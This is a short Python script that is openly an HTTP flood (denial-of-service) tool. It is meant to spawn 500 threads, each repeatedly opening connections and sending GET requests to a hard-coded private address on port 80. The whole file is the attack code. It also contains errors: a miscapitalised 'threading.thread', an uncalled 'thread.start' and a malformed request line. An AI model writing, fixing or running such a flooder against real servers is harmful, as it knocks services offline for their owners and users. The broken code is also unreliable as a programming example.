import socket
import threading

target = '10.0.2.15'
port = 80

def http_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET ? HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: 10.0.2.15" + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
for i in range(500):
    thread = threading.thread(target=http_flood)
    thread.start